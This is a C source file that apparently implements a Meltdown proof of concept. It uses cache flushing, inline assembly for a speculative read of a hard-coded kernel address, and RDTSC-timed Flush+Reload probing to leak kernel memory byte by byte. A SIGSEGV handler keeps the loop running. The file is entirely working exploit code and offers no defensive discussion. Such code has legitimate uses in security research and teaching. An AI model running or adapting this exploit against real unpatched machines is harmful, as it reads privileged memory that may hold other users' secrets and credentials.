#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>

#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <sys/mman.h>
#include <sys/stat.h>
#include <setjmp.h>
#include <signal.h>

#define SIZE 4096
#define NUM_TRACES 100000
#define TARGET_ADDR 0xffff9c652fb0ba80

uint8_t *target_addr = (uint8_t *) (TARGET_ADDR);
uint8_t data;
char *userArray;
size_t offset;
char *addr;
int s;
int threshold = 150;

void clflush(volatile void* Tx) {
    asm volatile("lfence;clflush (%0) \n" :: "c" (Tx));
}

static __inline__ uint64_t timer_start (void) {
    unsigned cycles_low, cycles_high;
    asm volatile ("CPUID\n\t"
                  "RDTSC\n\t"
                  "mov %%edx, %0\n\t"
                  "mov %%eax, %1\n\t": "=r" (cycles_high), "=r" (cycles_low)::
            "%rax", "%rbx", "%rcx", "%rdx");
    return ((uint64_t)cycles_high << 32) | cycles_low;
}

static __inline__ uint64_t timer_stop (void) {
    unsigned cycles_low, cycles_high;
    asm volatile("RDTSCP\n\t"
                 "mov %%edx, %0\n\t"
                 "mov %%eax, %1\n\t"
                 "CPUID\n\t": "=r" (cycles_high), "=r" (cycles_low):: "%rax",
    "%rbx", "%rcx", "%rdx");
    return ((uint64_t)cycles_high << 32) | cycles_low;
}

static __inline__ void maccess(void *p) {
    asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

static __inline__ void meltdownaccess(void *p, char *userArray) {
    asm volatile(
         "1:\n"
         "movzx (%%rcx), %%rax\n"
         "shl $12, %%rax\n"
         "jz 1b\n"
         "movq (%%rbx,%%rax,1), %%rbx\n"
         :: "c"((void*) target_addr), "b"(userArray)
         : "rax"
         );
}

uint32_t reload(void *p)
{
    volatile uint32_t time;
    uint64_t t1, t2;
    t1 = timer_start();
    maccess(p);
    t2 = timer_stop();
    return t2 - t1;
}

void *map_offset(const char *file, size_t offset) {
    int fd = open(file, O_RDONLY);
    if (fd < 0)
        return NULL;

    char *mapaddress = (char*) mmap(0, sysconf(_SC_PAGE_SIZE), PROT_READ, MAP_PRIVATE, fd, offset & ~(sysconf(_SC_PAGE_SIZE) -1));
    close(fd);
    if (mapaddress == MAP_FAILED)
        return NULL;
    return (void *)(mapaddress+(offset & (sysconf(_SC_PAGE_SIZE) -1)));
}

void unmap_offset(void *address) {
    munmap((char *)(((uintptr_t)address) & ~(sysconf(_SC_PAGE_SIZE) -1)),
           sysconf(_SC_PAGE_SIZE));
}

jmp_buf buffer;

static void unblock_signal(int signum __attribute__((__unused__))) {
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, signum);
    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

static void segfault_handler(int signum) {
    (void)signum;
    unblock_signal(SIGSEGV);
    longjmp(buffer, 1);
}

void meltdown() {
    userArray = (char *)malloc(SIZE * 256) ; // 256 memory pages
    memset(userArray, 0, SIZE * 256);
    //printf("User Array Set\n");
    int count = 0;
    int receivedData = 0;


    while(true){
        for(int i = 0; i < 256; i++){
                clflush(userArray + (i * SIZE));
        }

        if(!setjmp(buffer)){
                meltdownaccess(target_addr, userArray);
        }

        for (int i = 1; i < 256; i++) {
            int t = reload(&userArray[i * SIZE]);
            if (t < threshold) 
            {
                receivedData = i;
                break;
            }
        }

        if(receivedData != 0){
            printf("Attack Results: %c\n", (char)receivedData);
            if ((char)receivedData == '\0')
            {
                printf("\n");
                break;
            }
            receivedData = 0;
            count++;
            fflush(stdout);
            target_addr += 1;
        }
        // Message is 69 bytes. Terminate the program after receiving it. 
        if (count == 69) {
            printf("\n");
            break;
        }
    }
}

int main() {
    if(signal(SIGSEGV, segfault_handler) == SIG_ERR) {
        printf("failed");
        return -1;
    }

    meltdown();
    return 0;
}